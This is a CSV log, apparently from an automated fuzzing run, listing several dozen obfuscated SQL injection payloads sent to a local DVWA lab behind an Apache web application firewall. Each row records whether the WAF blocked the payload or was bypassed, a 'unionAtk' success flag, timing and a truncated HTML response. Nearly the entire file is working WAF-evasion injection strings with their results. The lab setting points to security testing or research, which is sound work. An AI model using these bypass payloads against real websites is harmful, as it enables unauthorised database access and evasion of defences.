Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=.1%0b||+!+1=+(!%0btrue)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0596,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+!+{x%0b(select+1)}=1=+(!+{x%0b(select%0b1)}=1,Bypassed,No,None,Invalid,0.0278,73.69,No,500,
0'<@=1.+or%0b!+{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Blocked,No,None,Invalid,0.0405,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+not+{`if`+1}=1=%0b(not~false)+||',Bypassed,No,None,Invalid,0.0117,73.69,No,500,
0'<@!=1+||%0bnot%0b{x+(select%0b1)}=1=+(!%0b{x+(select+1)}=1),Blocked,No,None,Invalid,0.0426,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||%0bnot+{x%0b(select%0b1)}=1=%0b(not+true)+||%27,Bypassed,No,None,Invalid,0.0694,73.69,No,500,
0%27<@!=1.%0bor+not%0b{x+(select%0b1)}=1=%0b(not+true)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0352,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or+!+{`if`%0b1}=1=%0b(!%0b{x+(select+1)}=1)--,Bypassed,No,None,Invalid,0.0349,73.69,No,500,
0%27<@!=1.+or%0b!%0b{x+(select%0b1)}=1=+(not%0b{`if`%0b1}=1)--,Blocked,No,None,Invalid,0.0311,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or+@<@.+||%0b!+{x%0b(select%0b1)}=1=%0b(not+{`if`+1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0661,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or%0bnot%0b{x+(select%0b1)}=1=%0b(not+{x+(select+1)}=1),Blocked,No,None,Invalid,0.0093,72.7,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0b||+!%0b{x+(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Invalid,0.023,72.7,No,500,
0%27<@=1%0b||+not%0b1=%0b(not+{`if`+1}=1)+or',Bypassed,No,None,Invalid,0.0195,72.7,No,500,
0'<@!=1.%0b||+not+{x+(select%0b1)}=1=+(!+{`if`+1}=1)+,Bypassed,No,None,Invalid,0.0311,72.7,No,500,
0'<@=1+or%0bnot+{`if`+1}=1=%0b(!%0b{x+(select+1)}=1)%0b,Bypassed,No,None,Invalid,0.0483,72.7,No,500,
0'<@!=1+or+!%0b{x+(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Invalid,0.0284,72.7,No,500,
0%27<@=.1%0bor%0bnot+1=%0b(not+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Invalid,0.029,72.7,No,500,
0'<@!=1+or+!%0b{x%0b(select%0b1)}=1=%0b(!%0btrue)%0bor',Bypassed,No,None,Invalid,0.0323,72.7,No,500,
0%27<@=1+or+!+{x%0b(select+1)}=1=+(not+{x+(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0276,72.7,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||+not+{`if`%0b1}=1=+(not+{x+(select+1)}=1)+,Bypassed,No,None,Invalid,0.0465,72.7,No,500,
0%27<@!=1+or+not%0b{`if`%0b1}=1=%0b(not+1)%0bor',Bypassed,No,None,Invalid,0.0237,72.7,No,500,
0%27<@!=1.+or+!+{`if`+1}=1=+(!%0b{`if`%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0192,72.7,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+not+{x+(select%0b1)}=1=%0b(!%0b{a+1}=1)%23,Bypassed,No,None,Invalid,0.0278,72.7,No,500,
0'<@=1+or+not+{x+(select+1)}=1=+(false)--%0b,Blocked,No,None,Invalid,0.0169,72.7,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+or+!+{x%0b(select+1)}=1=+(not+true)+||',Bypassed,No,None,Invalid,0.0833,73.07,No,500,
0'<@=.1%0bor%0bnot+1=%0b(!+1)+or',Bypassed,No,None,Invalid,0.0358,73.44,No,500,
0'<@!=1+or%0b!~false=+(!+{`if`%0b1}=1)+||%27,Bypassed,No,None,Invalid,0.0603,73.56,No,500,
0'<@=1.%0bor%0b{`if`%0b1}=1+like+{`if`%0b1}=1+||',Bypassed,No,None,Invalid,0.0374,73.69,No,500,
0'<@!=1.+or%0bnot+{x+(select%0b1)}=1=+(not+{`if`%0b1}=1)%23,Blocked,No,None,Invalid,0.0262,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0b||+!+{a%0b1}=1=+(false)%0bor%27,Bypassed,No,None,Invalid,0.0413,73.69,No,500,
0%27<@!=1.+or%0bnot+{`if`%0b1}=1=%0b(!+{`if`%0b1}=1)+||',Bypassed,No,None,Invalid,0.0306,73.69,No,500,
0'<@!=.1%0b||%0bnot+{x%0b(select%0b1)}=1=+(!%0b{x+(select+1)}=1),Bypassed,No,None,Invalid,0.012,73.69,No,500,
0%27<@=1.%0b||+{a%0b1}=1+like+{a+1}=1+||',Bypassed,No,None,Invalid,0.031,73.69,No,500,
0%27<@=1%0b||+not%0btrue=+(not%0b1)+or',Bypassed,No,None,Invalid,0.0229,73.69,No,500,
0%27<@!=1+or%0bnot+{x+(select%0b1)}=1=%0b(!%0b{x+(select%0b1)}=1),Blocked,No,None,Invalid,0.0303,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or+{`if`%0b1}=1%0blike+{a%0b1}=1%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0281,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||%0bnot%0b{x%0b(select%0b1)}=1=+(!~false)+or',Blocked,No,None,Invalid,0.0091,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+or%0b!%0b{a+1}=1=+(not+{x+(select%0b1)}=1)--,Blocked,No,None,Invalid,0.0436,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+||+not%0b{x+(select+1)}=1=+(!%0b{x+(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0331,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+{x+(select+1)}=1%0blike+{x%0b(select+1)}=1+||%27,Blocked,No,None,Invalid,0.0142,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+!%7efalse=+(!+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Invalid,0.0301,73.69,No,500,
0'<@=1+or+not+{a%0b1}=1=+(!%0b1)+or%27,Bypassed,No,None,Invalid,0.0377,73.69,No,500,
0'<@=1+or+not%7efalse=%0b(not%0b{`if`+1}=1)+||%27,Bypassed,No,None,Invalid,0.0534,73.69,No,500,
0%27<@!=1%0bor%0b!%0b{x+(select%0b1)}=1=+(!%7e0)%0bor',Bypassed,No,None,Invalid,0.0185,73.69,No,500,
0'<@=.1+or+not%0b{x%0b(select%0b1)}=1=+(!%0b1)--+,Bypassed,No,None,Invalid,0.0462,73.69,No,500,
0'<@!=.1+or%0bnot%0b{x+(select+1)}=1=%0b(not%7efalse)%0b||',Blocked,No,None,Invalid,0.0297,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or+not%0b{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0248,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||%0bnot%7efalse=+(!+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,Invalid,0.0305,73.69,No,500,
0%27<@!=1.+||+false=+(not%0b{a+1}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0245,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+!+{`if`+1}=1=+(!+{x+(select%0b1)}=1)--,Bypassed,Yes,Yes (unionAtk),Invalid,0.0259,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+not+{`if`+1}=1=%0b(not+{`if`%0b1}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0286,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
5%27+or%0b{a%0b1}=1+like%0btrue%0bor'0,Blocked,No,None,Invalid,0.0134,73.69,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+||+!%0b{`if`+1}=1=+(not%0b{`if`+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0246,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+!%0b{a+1}=1=+(!+{a%0b1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0143,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0b!%0b{a+1}=1=%0b(!%0b{x%0b(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0315,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+not+{a%0b1}=1=+(not%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0374,73.69,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||%0bnot~false=%0b(!+{x+(select%0b1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.0384,73.69,No,500,
0%27<@!=.1%0bor+not%0b{x+(select+1)}=1=+(!+true)%0bor',Bypassed,No,None,Invalid,0.0615,73.69,No,500,
0'<@!=.1%0bor%0b{a+1}=1+like%0b{x%0b(select+1)}=1+or',Bypassed,No,None,Invalid,0.0834,73.69,No,500,
0'<@!=1%0b||%0bnot%7efalse=+(not+{x+(select+1)}=1)+||%27,Bypassed,No,None,Invalid,0.0543,73.69,No,500,
0%27<@=1%0bor+not%7efalse=+(!%7efalse)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0376,72.7,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not+{`if`+1}=1=+(!+{x+(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0284,72.7,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor+!+{x+(select+1)}=1=%0b(not+{x%0b(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0531,72.7,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0bnot+{x+(select+1)}=1=+(false)+||%27,Bypassed,No,None,Invalid,0.0099,72.7,No,500,
